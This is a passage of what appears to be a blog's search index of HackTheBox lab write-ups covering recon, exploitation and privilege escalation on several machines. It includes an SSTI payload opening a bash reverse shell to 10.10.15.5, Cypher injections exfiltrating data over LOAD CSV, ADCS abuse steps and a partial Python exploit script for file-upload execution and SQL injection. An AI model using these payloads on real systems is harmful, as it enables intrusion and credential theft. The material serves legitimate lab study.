remote command execution " }, { "title": "Keeper Report", "url": "/posts/HTBKeeper/", "categories": "HTB", "tags": "HTB, Linux, Easy, Information Leakage, Keepass, CVE-2023-32784", "date": "2023-09-04 12:00:00 -0500", "snippet": "Information gatheringScope: 10.10.11.227/32 (Linux)TCP Nmap scan: 65,535 ports Open ports: 22/ssh: Banner grabbing Version: OpenSSH_8.9p1 Ubuntu-3ubuntu0.3 OpenSSH 9.4/9.4p1 (2023-08-10) Codename: jammy-security (codename.py) CVEs Version https://nvd.nist.gov/vuln/search/results?form_type=Advanced&amp;amp;cves=on&amp;amp;cpe_version=cpe:/a:openbsd:openssh:8.9 Valid credentials: (lnorgaard:Welcome2023!) 80/http: Banner grabbing Link to an IT Support Ticket domain: http://tickets.keeper.htb/rt/ Resolving to Local DNS server Technologies HttpServer: Nginx/1.18.0 (Ubuntu Linux) Sofware: Request tracker (ticket-tracking software) Version: 4.4.4+dfsg-2ubuntu1 (Debian) Copyright 1996-2019 (2019-03-05) Security updates Latest verssion RT 5.0.4 (2023-05-04) Github repository: https://github.com/bestpractical/rt CVEs version https://www.cvedetails.com/vulnerability-list/vendor_id-8416/product_id-14710/Bestpractical-Request-Tracker.html: HttpOnly header The cookie cannot be accessed through the client-side script (XSS prevention) Email: sales@bestpractical.com Login panel Request Tracker (Home) Enumeration Some requests response (Possible cross-site request forgery) Users Inorgaard (id:27)(Name: Lise Nørgaard)(Email: lnorgaard@keeper.htb) Information (Leaked Password in the about section) root (id:14)(Name: Enoch root)(Email: root@localhost) Vulnerability assessment Valid Default credentials (root:password) Prevention You should not run this server against port 80 (which is the default port) because that requires root-level privileges https://github.com/bestpractical/rt/blob/stable/docs/web_deployment.pod Disable root user access, remove privileges or change default password Exploitation Valid SSH credential (Reuse Credentials) (lnorgaard:Welcome2023!) Prevention Inform the employer about good practices in the exposure and use of passwords Post-exploitation lnorgaard Enumeration RT login (ticket issue) ” Attached to this ticket is a crash dump of the keepass program. Do I need to update the version of the program first…? “ Home directory .zip: RT30000.zip Keypass files (version 2.x) CVE-2023-32784 https://nvd.nist.gov/vuln/detail/CVE-2023-32784 Exploits Windows env: https://github.com/vdohney/keepass-password-dumper Linux env: https://github.com/4m4Sec/CVE-2023-32784 Keepass file Password (danish language): “rødgrød med fløde” Use Puttygen tool to convert .ppk to .pem (open ssh id_rsa) Prevention Upload the latest version Upcoming Keepass Security Preventions (July 2023) Perform direct API calls for getting/setting the text of the text box, avoiding the creation of managed strings in memory that can leak secrets. Create dummy fragments containing random characters in the process memory that will have approximately the same length as the user’s master password, obfuscating the real key. Lateral movementProof of concept CVE-2023-32784 Windows env (deploy windows virtual machine) Linux env Keepass password db access keeweb online https://app.keeweb.info/ Keepass windows (env machine) " }, { "title": "Format Report", "url": "/posts/HTBFormat/", "categories": "HTB", "tags": "HTB, Linux, Medium, LFI, RCE, Python Scripting", "date": "2023-08-31 12:00:00 -0500", "snippet": "Information gatheringScope: 10.10.11.213/32 (Linux)TCP Nmap scan: 65,535 ports Open ports: 22/ssh (Secure Shell Protocol) Banner grabbing Version: OpenSSH_8.4p1 Debian-5+deb11u1 Codename 80/http (Hypertext Transfer Protocol) Banner grabbing http://10.10.11.213 Technologies Server version: Nginx 1.18.0 Redirect: http://app.microblog.htb http://app.microblog.htb (app to create blog with any subdomain) Technologies Jquery 3.6.1 Interface Default cookie: username=gegmloskesuar8vml26rnhtg9t Basic url scrapping http://app.microblog.htb/register (valid) Created blog: http://marss.microblog.htb/ Technologies Php Vulnerable to basic XSS (Cross Site Scripting) 3000/ppp (Point to Point Protocol) Banner grabbing Technologies Server: Nginx 1.18.0 Redirect: http://microblog.htb:3000 Service: Gitea (1.17.3) Interface Basic url scrapping http://microblog.htb:3000/cooper/microblog (Microblog Git) (Dangerous) User: cooper Code analysis (http://microblog.htb:3000/cooper/microblog.git) microblog/microblog-template/edit/index.php (fetchPage function) This functions add a header or text to our blog: A file is created with the html content to be entered and without verification, the “id” parameter of the request is used as the file name Then the “id” value is added to “order.txt” This function read every line of “order.txt” file and use file_get_contents() (Local File Inclusion!) Vulnerability assessment Nginx server configuration file (/etc/nginx/sites-available/default) (http://app.microblog.htb) Controlling proxied host: https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/ location ~ /static/(.*)(.*) -&amp;gt; proxy_pass http:\\/\\/$1.microbucket.htb\\/$2 Example: microblog.htb/statis/js/test.js -&amp;gt; http://js.microblog.htb/test.js Nginx supports proxying requests to local unix sockets Server unix socket leaked (source code Gitea) Example to get info server (no response): Request: INFO /static/unix:/var/run/redis/redis.sock:server%20/app.js HTTP/1.1 Breakdown: http://unix:/var/run/redis/redis.sock:server%20microblog.htb/app.js Socket receive: INFO server -microbucket.htb/app.js HTTP/1.0 Server example: Change current username (first-name) Redis function: HSET https://redis.io/commands/hset/ HSET key field value Request: HSET /static/unix:/var/run/redis/redis.sock:&amp;lt;key&amp;gt;%20&amp;lt;field&amp;gt;%20&amp;lt;value&amp;gt;%20/any (last space is important to valid command, see previous example) Breakdown: http://unix:/var/run/redis/redis.sock:key%20field%20value%20microblog.htb/any Socket receive: HSET key field value microblog.htb/any HTTP/1.0 Code analysis (microblog/microblog-template/edit/index.php) We can change permission to be a pro user and upload a “image” with php code (rabbit hole) Exploitation Create user and conver to Pro Like pro user we have access to /uploads: path = /var/www/microblog/” . $blogName . “/uploads Use previous LFI to create a file on upload folder and view/execute content (pwned) Execute reverse shell in bash and receive a shell like www-data Post-exploitation www-data user Redis socket connection (no authentication) Cooper credentials leaked: cooper:zooperdoopercooper Lateral movement Reusing Credentials (cooper:zooperdoopercooper) Binary with SUDO permissions (/usr/bin/license) Code analysis Format String vulnerability (PoC below) Create hash key on redis database to read secret variable Proof of concept Python script (LFI) Change redis data (redis sock) Python format function vulnerability Python PoC script: https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tool_Format" }, { "title": "Only4You Report", "url": "/posts/HTBOnly4You/", "categories": "HTB", "tags": "HTB, Linux, Medium, Python Scripting, RCE, LFI, CypherI, Pip", "date": "2023-08-27 12:00:00 -0500", "snippet": "Only4you ReportInformation gatheringScope: 10.10.11.210/32 (Linux)TCP Nmap scan: 65,535 ports Open ports: 22/ssh (secure shell protocol) Banner grabbing Version: OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 (codename: focal) (no vulnerable) 80/http (hypertext transfer protocol) Banner grabbing HTTPServer: nginx/1.18.0 (Ubuntu) RedirectLocation: http://only4you.htb/ On web content they say: “We also have some products in beta version to show!” and below a link to products available to check http://beta.only4you.htb/ Source code provided Code Analysis app.py (low protection when validating file download) Vulnerability assessment Code Analysis (app.py) (/var/www/beta.only4you.htb) Absolute path not checked (/etc/hosts) Python script (lfi.py) Exploitation Code analysis (app.py) (/var/www/only4you.htb) PoC (ICMP connection) www-data (shell) Post-exploitation User enumeration (www-data) Internal open ports Forward socks proxy (chisel_linux): https://github.com/jpillora/chisel http://127.0.0.1:3000 Server: Gogs (A painless self-hosted Git service) Reuse credential: john:ThisIs4You http://127.0.0.1:8001 Server: gunicorn/20.0.4 (Python WSGI HTTP Server for UNIX) Valid credentials: admin:admin http://127.0.0.1:8001/search (Vulnerable to Cypher injection Neo4j) Neo4j Investigation (PoC part below) select * from users = match (n:users) return n List labels user, employee List values (user) username, password Credentials admin:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 (admin) john:a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 (ThisIs4You) Valid SSH Credentials http://127.0.0.1:7474 Server: neo4j 5.6.0 (Graph database management system developed by Neo4j) No valid credentials Vulnerable Lateral movement Persistence: SSH key pair generation System user enumeration (John:ThisIs4You) Security police command list Pip download vulnerability “Pip download” does the same resolution and downloading as pip install (execute setup.py with metadata and dependecies, etc) , but instead of installing the dependencies, it collects the downloaded distributions into the directory provided (defaulting to the current directory) The issue occurs only when the package contains a tar.gz file instead of a wheel (.whl) file, which “cuts the ‘setup.py’ execution out of the equation.” Building and Distributing Packages with Setuptools https://setuptools.pypa.io/en/latest/userguide/index.html Creating malicious package (with any os command that you nedd) Build package Upload tar.gz to Gogss Server (http://127.0.0.1:3000) (Local port forward) Create new or use a repository (if use a new repo uncheck private repository) Upload package (package.tar.gz) Download package with SUDO pip and get Remote Code Execution like root Proof of concept Cypher injection (Local Neo4j console) Environment Create new label: CREATE (a:USERS {name:’admin’, password:’admin123’}) Valid data created Show labels: CALL db.labels() Match labels node: MATCH (a:USERS) WHERE a.name=’admin’ return a.name Basic injection match (a:USERS) where a.name=’’ or 1=1 return a.name List Neo4j version match (a:USERS) where a.name=’’ or 1=1 CALL dbms.components() YIELD versions UNWIND versions as version LOAD CSV FROM ‘http://10.10.15.5/?version=’ + version as l RETURN 0//return a.name List labes (“tables”) match (a:USERS) where a.name=’’ or 1=1 CALL db.labels() YIELD label LOAD CSV FROM ‘http://10.10.15.5/?=’ + label as l RETURN 0//return a.name List values match (a:USERS) where a.name=’’ or 1=1 match (x:USERS) UNWIND keys(x) as k LOAD CSV FROM ‘http://10.10.15.5/?’ + k + ‘=’ + toString(x[k]) as l RETURN 0//return a.name Python script https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_Only4You LFI &amp;amp;&amp;amp; RCE &amp;amp;&amp;amp; CYPHER INJECTION " }, { "title": "Sandworm Notes", "url": "/posts/HTBSandworm/", "categories": "HTB", "tags": "HTB, Linux, Medium, SSTI, CVE-2022-31214, Bash Scripting", "date": "2023-08-18 12:00:00 -0500", "snippet": "Sandworm NotesInformation gatheringScope: 10.10.11.218/32 (Linux)TCP Nmap scan: 65,535 ports Open ports: 22/ssh (Secure Shell Protocol) Banner Grabbing Service OpenSSH_8.9p1 Ubuntu-3ubuntu0.1 Latest version: OpenSSH 9.4/9.4p1 (2023-08-10) Authentication: (publickey, password) Valid credentials None 80/http (Hypertext Transfer Protocol) Banner Grabbing Redirection: https://ssa.htb/ (10.10.11.218:443) Add domain to Local DNS Server (/etc/hosts) echo “10.10.11.218 ssa.htb” | sudo tee -a /etc/hosts 443/https (Hypertext Transfer Protocol Secure) Location: https://ssa.htb/ Banner Grabbing Technologies HTTPServer: Ubuntu Linux (nginx/1.18.0) Jquery Flask &amp;amp; trade Web Interface FIrefox Posible user: atlas@ssa.htb Url Scrapping Directory enumeration: https://ssa.htb/guide PGP Encryption (Pretty Good Privacy): Encryption system used for both sending encrypted emails and encrypting sensitive files Generate key Then create message, signed it and export public key Finally use them in web service and we get valid verification https://ssa.htb/pgp https://ssa.htb/login Valid credentials: None Vulnerability assessment In the signature verification result we view some output when we created out public key In addition, from our enumeration we know that the site uses the flask framework to set up the web SSTI (Server Site Template Injection) Is possible when an attacker injects template directive as user input that can execute arbitrary code on the server PoC: https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee We generate our public key, but this time we write on field that is reflected (Name) this: {{7*7}} If we look at output 49, we will known that is vulnerable (VULNERABLE) SSTI bash script Enumeration: Mysql credentials: mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA Exploitation SSTI (Server Site Template Injection): https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee Using __class__ and __mro__ objects: (ssti.sh) https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tool_Sandworm Searching Subprocess.Popen classs to execute commands Payload: {{’’.__class__.__mro__[1].__subclasses__()[439](&quot;bash -c ‘bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.5/4444 0&amp;gt;&amp;amp;1’&quot;,shell=True,stdout=-1).communicate()}} Post-exploitation System User (Atlas) (Sandbox): A sandbox is a type of software testing environment that enables the isolated execution of software or programs for independent evaluation Firejail: Firejail is a SUID sandbox program that reduces the risk of security breaches by restricting the running environment of untrusted applications using Linux namespaces, seccomp-bpf and Linux capabilities Home directory enumeration (atlas) HTTPie: Provides a simple http command that allows for sending arbitrary HTTP requests using a simple and natural syntax ~/.config/httpie/sessions/localhost_5000/admin.json Credentials: silentobserver:quietLiketheWind22 (system user /etc/passwd) Web service login Lateral movement System credentials Reuse: silentobserver:quietLiketheWind22 Enumeration (silentobserver) SUID files Owner: Atlas user /opt/tipnet/target/debug/tipnet Dependencies files: /opt/tipnet/target/debug/tipnet.d /opt/crates/logger/src/lib.rs (-rw-rw-r– 1 atlas silentobserver) FIle modification Rust RCE: /opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1 /opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48 Process script (pspy.sh) We can view the execution of Cargo and the previos Rust script (tipnet)and dependencies (tipnet.d): Cargo is a default tool for managing dependencies in Rust Reverse shell like user Atlas Persistence: create pair rsa keys and add pubkey to authorized keys Enumeration /usr/local/bin/firejail (0.9.68) (CVE-2022-31214) https://nvd.nist.gov/vuln/detail/CVE-2022-31214 Exploit https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25 Proof of concept" }, { "title": "Cerberus Notes", "url": "/posts/HTBCerberus/", "categories": "HTB", "tags": "HTB, Windows, Hard, CVE-2022-24715, CVE-2022-24716, Python Scripting, Bash Scripting", "date": "2023-08-14 12:00:00 -0500", "snippet": "Cerberus NotesInformation gatheringScope: 10.10.11.205/32 (Windows Machine)TCP Nmap scan: 65,535 ports Open ports: 8080/http-proxy: Banner grabbing Server: Apache/2.4.52 (Ubuntu) (172.16.22.2:80) Server mounted on a different network Redirection: http://icinga.cerberus.local:8080/icingaweb2 Add to Local DNS server: Web Service enumeration: Firefox: Curl Url scrapping: Service: Icinga web2: What is Icinga?: https://github.com/Icinga Icinga is a resilient, open source monitoring and metric solution system. Icinga web2: https://github.com/Icinga/icingaweb2 A lightweight and extensible web interface to keep an eye on your environment. Analyse problems and act on them. searchsploit: Vulnerability assessment CVE-2022-24716: NIST: https://nvd.nist.gov/vuln/detail/CVE-2022-24716 PoC: https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/ Bash script (PoC): CVE-2022-24715: (authenticated) Nist: https://nvd.nist.gov/vuln/detail/CVE-2022-24715 Exploitation process: https://exploit-notes.hdks.org/exploit/web/icinga-web-pentesting/ Payload: Exploitation Enumeration (CVE-2022-24716): System: /etc/issue &amp;amp; /etc/lsb-release: Ubuntu 22.04.1 LTS (codename: jammy) /proc/version: Linux version 5.15.0-43-generic (buildd@lcy02-amd64-076) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) 46-Ubuntu SMP Tue Jul 12 10:30:17 UTC 2022 Icinga default config files: https://icinga.com/docs/icinga-web/latest/doc/03-Configuration/ /etc/icingaweb2/resources.ini /etc/icingaweb2/roles.ini /etc/icingaweb2/authentication.ini Python script https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/CVEs_Cerberus/cve-2022-24716.sh Icinga administrator Database and authentication credentials: user:pass: matthew:IcingaWebPassword2023 dbname: icingaweb2 host: 172.16.22.1 Icinga web service authentication: (matthew:IcingaWebPassword2023) About: Exploitation (CVE-2022-24715): https://github.com/JacobEbben/CVE-2022-24715/blob/main/exploit.py#L331(reference) Python script: https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/CVEs_Cerberus/cve-2022-24715.py . . . Post-exploitationLateral movementProof of concept" }, { "title": "Pilgrimage Notes", "url": "/posts/HTBPilgrimage/", "categories": "HTB", "tags": "HTB, Linux, Easy, CVE-2022-44268, CVE-2022-4510, Python Scripting", "date": "2023-08-10 12:00:00 -0500", "snippet": "Pilgrimage ReportInformation gatheringScope: 10.10.11.219/32 (Linux)Open ports:22/ssh (Secure shell protocol): Banner grabbing: netcat: OpenSSH_8.4p1 Debian-5+deb11u1 80/http (Hypertext transfer protocol) Banner grabbing: netcat: Server: nginx/1.18.0 whatweb: RedirectLocation [http://pilgrimage.htb/] curl: Firefox: “A free online image shrinker. Create an account to save your images!” Interesting path: href=”login.php” href=”logout.php” href=”register.php” Account created: Username: marss123 Password: marss123 Save image function: Name: (Probably hash generated by upload time) http://pilgrimage.htb/shrunk/64cebf “2ea9b1f.jpeg” http://pilgrimage.htb/shrunk/64cebf “d9543a9.jpeg” Directory Fuzzing: .git (403 forbidden): /config Download git folder: Not permissions Fuzzing Manual enumeration: Locate last commit of proyect: (HEAD) Examine the current commit: Ruby Reverse: (sha1sum) Python Author: emily@pilgrimage.htb (probably system user) Content: Git modes: https://krishnabiradar.com/blogs/deconstructing-a-git-commit/ 100644 for a normal file 100755 for an executable file 040000 for a directory 120000 for a symbolic link Download required files to create a valid git repository (.git) HEAD Head object and respective tree master branch We can reconstruct more git objects with same process: Then we can extract objects content with bash: With python we can extract hash of tree object, only we need to convert some ascii to hexadecimal: (compare with previous image) Automate process Gitdumper.sh https://github.com/internetwache/GitTools/tree/master/Dumper Vulnerability assessment File magick(executable) on git enumeration: Used for? Use the magick program to convert between image formats Used on current web server: http://10.10.11.219:80 Magick file (CVE-2022-44268): Hackerone https://hackerone.com/reports/1858574 PoC https://www.vicarius.io/blog/cve-2022-44268-arbitrary-remote-leak-in-imagemagick Exploitation Python script: (CVE-2022-44268) references: https://stackoverflow.com/questions/9036152/insert-a-text-chunk-into-a-png-image/51058689?noredirect=1#comment93319814_51058689 Search interesting files to read: dashboard.php, index.php, login.php (database file path) Sqlite db dump with previous script to read files and download too: Credentials: emily:abigchonkyboi123 Post-exploitation Initial persistence: SSH key-pair generation (~/.ssh/authorized_keys) Vulnerable version Binwalk binary (CVE-2022-4510): Research: https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/ Plugin creation binkwalk:https://github.com/ReFirmLabs/binwalk/wiki/Creating-Custom-Plugins#plugin-activation Monitor script: /usr/sbin/malwarescan.sh /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/: this command listen for events when a file/dir is created on specific path (only files CREATED: IMPORTANT) To exploit process: create image with malicious plugin and download on target path: /var/www/pilgrimage.htb/shrunk/ Lateral movementProof of concept" }, { "title": "Sau Notes", "url": "/posts/HTBSau/", "categories": "HTB", "tags": "HTB, Linux, Easy, SSRF, Python Scripting", "date": "2023-08-04 12:00:00 -0500", "snippet": "Sau ReportInformation gatheringScope: 10.10.11.224 (Linux) Nmap scan:Open ports:22/ssh (Secure shell protocol): Banner grabbing: OpenSSH_8.2p1 Ubuntu-4ubuntu0.7 55555/uknown (http): Banner grabbing: Netcat: 400 Bad Request Whatweb: Firefox: Directory Enumeration Curl: Service version: Vulnerable to SSRF (Server side request forgery): Request basket API: https://rbaskets.in/api.html Create baskets: test Set forward URL and Proxy response option Go to http://10.10.11.224:55555/test: Vulnerability assessmentScanning internal ports: Python scripting: sau.py https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tool_Sau Important to RCE: expand_path = True Important to scan internal ports: proxy_response = True Internal port 80: Maltrail (v0.53) (Default port 8338) ExploitationFoothold (puma user):Post-exploitationSudo permissions without password on a commad: sudo /usr/bin/systemctl status trail.service: With a interactive TTY: Sudoers file: The /etc/sudoers file is used to store all sudo privileges, such as which users are allowed to run sudo, which commands they are allowed to execute as sudo, which users they are allowed to impersonate and whether this will require a password to be entered. Lateral movementProof of concept" }, { "title": "Authority Notes", "url": "/posts/HTBAuthority/", "categories": "HTB", "tags": "HTB, Windows, Medium, ADCS, LDAP Relay", "date": "2023-08-03 12:00:00 -0500", "snippet": "Authority ReportInformation gatheringScope: 10.10.11.222 (Windows) [Active Directory]Open ports:53/domain (Domain name system):80/http (Hypertext transfer protocol): whatweb: HTTPServer[Microsoft-IIS/10.0] 88/kerberos-sec (Kerberos authentication protocol),464/kpasswd5 (allows changing user passwords): No stuff135/msrpc (Remote procedure call),593/http-rpc-epmap (RPC over http): Required credentials: True139/netbios-ssn,445/microsoft-ds (Network file sharing protocol over NetBIOS): crackmapexec: Windows 10.0 Build 17763 x64 [Windows Server 2019 (version 1809)] (name:AUTHORITY) (domain:[authority.htb]) (signing:True) (SMBv1:False) Smbmap: Guest acess: Enabled Smbclient: Downloaded data: Ansible: Used to [manage and execute core functions in Windows environments], from security updates to remote management [using WinRM] ADCS (Active Directory Certificate Services): Provides [public key infrastructure (PKI)] for cryptography, digital certificates and signature capabilities: requirements.txt: ansible&amp;gt;=2.10 jinja2&amp;gt;=2.11.2 tox.ini: minversion = 3.21.4 envlist = py{310}-ansible-{4,5,6} LDAP (Lightweight directory access protocol) Todo.md .travis.yml PWM (Pulse Width Modulation): Open source [password self-service application for LDAP directories] ansible.cfg: Ansible configuration file remote_user = svc_pwm ansible_inventory: Allows system administrators to [keep track of their managed remote systems] defaults/main.yml: https://docs.ansible.com/ansible/latest/vault_guide/vault_managing_passwords.html John cracking: secret -&amp;gt; !@#$%^&amp;amp;* ansible-vault: https://www.shellhacks.com/ansible-vault-encrypt-decrypt-string/ admin-login: [svc_pwm] admin-password: [pWm_@dm!N_!23] ldap_admin_pass: [DevT3st@123] Ansible vaults: Feature that [allows users to encrypt values and data structures within Ansible projects] templates/tomcat-users.xml.j2: username=”[admin]” password=”[T0mc@tAdm1n]” roles=”manager-gui” user username=”[robot]” password=”[T0mc@tR00t]” roles=”manager-script” SHARE: 389/ldap,636/ldapssl (Lightweight directory access protocol): No stuff.5985/wsman (Web services-management),47001/winrm (Windows remote management): No stuff.8443/https-alt (Http secure): curl: PWN: Config mode: Version: Login error: [5017] ldaps://authority.authority.htb:636 as CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb Access: [pWm_@dm!N_!23] Configuration manager: Confifuration editor: 9389/adws (Active directory web service): No stuff.49664/unknown49665/unknown49666/unknown49667/unknown49671/unknown49684/unknown49685/unknown49687/unknown49688/unknown49696/unknown49699/unknown49704/unknown49713/unknownVulnerability assessment https://authority.htb:8443/pwm/private/config/manager: We can download and upload PWM configuration file: [PwmConfiguration.xml] Exploitation LDAP Relay attack: responder: Capturing svc_ldap password in cleartext [LDAP] Cleartext Client : 10.10.11.222 [LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb [LDAP] Cleartext Password : lDaP_1n_th3_cle4r! crackmapexec: Valid credentials to winrm: Access-evil-winrm: Post-exploitation ADCS Review: A certificate template collection of settings that [defines the policies and rules that a CA uses when a request for a certificate is received] CA (Certificate Authority]): PKI (Public Key Infrastructure): [Manages certificates and public key encryption] AD CS (Active directory Certificate Services): [Microsoft’s PKI implementation which usually runs on domain controllers] CA (Certificate Authority): [PKI that issues certificates] CSR (Certificate Signin Request): [message sent to a CA to request a signed certificate] EKU (Extended/Enhanced Key Usage): object identifiers that [define how a generated certificate may be used] Administrators of AD CS can create several templates that can allow any user with the relevant permissions to request a certificate themselves Abusing Active Directory Certificate Services (ADCS): 1st method: Manual search: certutil -v -template &amp;gt; cert_templates.txt foreach ($template in type cert_templates.txt | select-string -Pattern &#39;Template\\[\\d{1,2}\\]|Allow Enroll|Allow Full Control|Client Authentication|CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT&#39;) { echo &quot;$template&quot;; } Template[8] Certify: .\\Certify.exe find /vulnerable .\\Certify.exe request /ca:authority.authority.htb\\AUTHORITY-CA /template:CorpVPN /altname:Administrator [FAILED] 2nd method: Authenticated Users group: Can enrol up to 10 new machines on the domain Validate write to DNS hostname: This permission allows us to [update the DNS hostname of our AD Object] associated with the host. Validate write to Service Principal Name (SPN): This permission allows us to [update the SPN of our AD Object] associated with the host. SPNs: Used by Kerberos authentication to [associate a service instance with a service logon account] Process: https://www.prosec-networks.com/en/blog/adcs-privescaas/ Compromise the credentials of a low-privileged AD user. Use those credentials to enrol a new host on the domain. Generate certificate request to added host and vulnerable template Impersonate an administrator. Login with certificate: [Fail] (Error support) The .pfx must be converted to a .crt and to a .key: PassTheCert: https://github.com/AlmondOffSec/PassTheCert/tree/main/Python Ldap authentication: [Add user to administrators group] Lateral movementProof of concept" }, { "title": "Help tools", "url": "/posts/HTBHelp/", "categories": "HTB", "tags": "HTB, Linux, Easy, Python Scripting, Arbitrary File Upload, SQLI", "date": "2023-07-31 12:00:00 -0500", "snippet": "Python ScriptWith the script you can execute uploaded file and dump the database:#!/usr/bin/env python3&quot;&quot;&quot;Help HTB--------Author: MarssDate: 28 Jul, 2023&quot;&quot;&quot;from argparse import ArgumentParser, RawDescriptionHelpFormatterfrom datetime import datetimefrom hashlib import md5from json import loadsfrom pwn import *from re import findallfrom requests import Session, Request, getfrom requests.exceptions import ConnectionErrorfrom signal import signal, SIGINTfrom string import ascii_lowercase, ascii_letters, digits, punctuationfrom sys import argv# debuggingimport pdb# Ctrl + C# (function)def signal_handler(signum, frame): exit(&#39;\\n[!] User abort.&#39;)# (signal)signal(SIGINT, signal_handler)# Main classclass Exploit: def __init__(self, args): self.args = args self.target = { &#39;ip&#39;:&#39;10.10.10.121&#39;, &#39;domain&#39;:&#39;help.htb&#39;, &#39;credentials&#39;: { &#39;helpdesk_user&#39;: None, &#39;helpdesk_pass&#39;: None, }, &#39;csrfhash&#39;: None, &#39;ticket_url&#39;: None, &#39;pattern_one&#39;: ascii_lowercase + &#39;_&#39;, &#39;pattern_two&#39;: ascii_letters + digits + punctuation } self.session = Session() # proxies #self.proxies = {&#39;http&#39;:&#39;127.1:8080&#39;} #self.session.proxies.update(self.proxies) def run(self): try: if self.verify_connection(): if self.args.file: # Arbitrary file upload current_time = self.get_server_time() self.execute_file_uploaded(current_time) if self.args.dump: # Blind SQLi self.save_helpdesk_credentials() self.save_csrf_hash() self.dump_database() except Exception as error: exit(&#39;\\n[!] Error: &#39; + repr(error)) def verify_connection(self) -&amp;gt; bool: try: response = get(&#39;http://&#39; + self.target[&#39;ip&#39;]) if response.status_code == 200: print(&#39;\\n[*] Target is up!&#39;) return True except ConnectionError: exit(f&quot;\\n[!] Verify connection with the target or resolve &#39;{self.target[&#39;domain&#39;]}&#39; on your local DNS server (/etc/hosts).&quot;) def get_server_time(self) -&amp;gt; int: response = get(&#39;http://&#39; + self.target[&#39;domain&#39;]) date_format = &#39;%a, %d %b %Y %H:%M:%S %Z&#39; # Sat, 29 Jul 2023 04:14:39 GMT current_date = datetime.strptime(response.headers[&#39;Date&#39;], date_format) init_date = datetime(1970, 1, 1) date_diff_seconds = (current_date - init_date).total_seconds() return int(date_diff_seconds) def execute_file_uploaded(self, current_time: int): p = log.progress(&#39;Searching uploaded file&#39;) # estimated time: 5 minutes = 300 seconds seconds = 0 file_found = False while not file_found and seconds &amp;lt;= 300: file_name_by_time = self.args.file + str(current_time - seconds) md5_hash = md5(file_name_by_time.encode(&#39;utf-8&#39;)).hexdigest() file_path = &#39;http://&#39; + self.target[&#39;domain&#39;] + &#39;/support/uploads/tickets/&#39; + md5_hash + &#39;.php&#39; p.status(file_path) response = get(file_path) if response.status_code == 200: file_found = True exit(f&#39;\\n[+] File executed! -&amp;gt; {file_path}&#39;) seconds += 1 print(&#39;\\n[-] File not found.&#39;) def save_helpdesk_credentials(self): graphql_query = &#39;http://&#39; + self.target[&#39;domain&#39;] + &#39;:3000&#39; + &#39;/graphql?query={user{username,password}}&#39; response = get(graphql_query) self.target[&#39;credentials&#39;][&#39;helpdesk_user&#39;] = loads(response.text)[&#39;data&#39;][&#39;user&#39;][&#39;username&#39;] md5_hash = loads(response.text)[&#39;data&#39;][&#39;user&#39;][&#39;password&#39;] # godhelpmeplz self.target[&#39;credentials&#39;][&#39;helpdesk_pass&#39;] = self.md5_reverse_API(md5_hash) def md5_reverse_API(self, _hash) -&amp;gt; str: # https://md5decrypt.net/en/Api/ hash_type = &#39;md5&#39; temp_email = &#39;desano6793@wiemei.com&#39; code = &#39;b637cf7ff9580e2d&#39; url = f&#39;https://md5decrypt.net/en/Api/api.php?hash={_hash}&amp;amp;hash_type={hash_type}&amp;amp;email={temp_email}&amp;amp;code={code}&#39; response = get(url) if response.status_code == 200: return response.text else: exit(&#39;\\n[!] Error: Maybe you need to a new code with a temporal email&#39;) def save_csrf_hash(self): req = Request(&#39;GET&#39;, &#39;http://&#39; + self.target[&#39;domain&#39;] + &#39;/support&#39;) prepare_req = self.session.prepare_request(req) response = self.session.send(prepare_req) self.target[&#39;csrfhash&#39;] = findall(r&#39;name=&quot;csrfhash&quot; value=&quot;(.*?)&quot;&#39;, response.text)[0] def helpdesk_login(self): post_data = { &#39;do&#39;: &#39;login&#39;, &#39;csrfhash&#39;: self.target[&#39;csrfhash&#39;], &#39;email&#39;: self.target[&#39;credentials&#39;][&#39;helpdesk_user&#39;], &#39;password&#39;: self.target[&#39;credentials&#39;][&#39;helpdesk_pass&#39;], &#39;btn&#39;: &#39;Login&#39; } req = Request(&#39;POST&#39;, &#39;http://&#39; + self.target[&#39;domain&#39;] + &#39;/support/?v=login&#39;, data=post_data ) prepare_req = self.session.prepare_request(req) self.session.send(prepare_req) def get_ticket_id(self) -&amp;gt; str: try: req = Request(&#39;GET&#39;, &#39;http://&#39; + self.target[&#39;domain&#39;] + &#39;/support/?v=view_tickets&#39;) prepare_req = self.session.prepare_request(req) response = self.session.send(prepare_req) ticket_id = findall(r&#39;param\\[\\]=(\\d{1,2})&#39;, response.text)[0] self.save_ticket_url(ticket_id) return ticket_id except Exception as error: print(&#39;\\n[-] No tickets found.&#39;) exit(&#39;\\n[!] Please manually add a new ticket with an attachment in helpdeskz.&#39;) def save_ticket_url(self, ticket_id): req = Request(&#39;GET&#39;, &#39;http://&#39; + self.target[&#39;domain&#39;] + f&#39;/support/?v=view_tickets&amp;amp;action=ticket&amp;amp;param[]={ticket_id}&#39;) prepare_req = self.session.prepare_request(req) response = self.session.send(prepare_req) self.target[&#39;ticket_url&#39;] = re.findall(r&#39;param\\[\\]=\\d{1,2}(.*?)&quot;&#39;, 